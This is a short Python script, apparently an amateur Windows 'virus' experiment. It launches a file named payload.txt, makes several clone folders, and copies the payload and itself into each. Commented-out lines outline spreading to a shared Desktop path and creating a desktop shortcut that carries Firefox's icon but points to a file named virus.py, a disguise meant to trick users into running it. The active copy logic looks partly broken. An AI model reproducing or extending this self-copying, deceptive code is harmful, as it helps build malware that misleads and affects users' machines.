from sys import argv

import os
#import os, winshell
#from win32client.client import Dispatch

script = argv
name = str(script[0])

cmd = 'start payload.txt'
os.system(cmd)
for i in range(1,5):
  os.mkdir('clone' + str(i))
  os.system(r"copy payload.txt clone"+str(i))
  os.system(r"copy " + name + " clone")
#os.mkdir('\\\psf\\Home\\Desktop\\clone')
#os.system(r"copy payload.txt \\\psf\\Home\\Desktop\\clone")
#os.system(r"copy " + name + " \\\psf\\Home\\Desktop\\clone")

#desktop = winshell.desktop()
#path = os.path.join(desktop, "firefox.lnk")
#target = r"C:\clone\virus.py"
#wDir = r"C:\clone"
#icon = r"C:\Program Files (x86)\Mozilla Firefox\firefox.exe"

#shell = Dispatch('Wscript.Shell')
#shortcut = shell.CreateShortCut(path)
#shortcutTargetpath = target
#shortcut.WorkingDirectory = wDir
#shortcut.IconLocation = icon
#shortcut.save()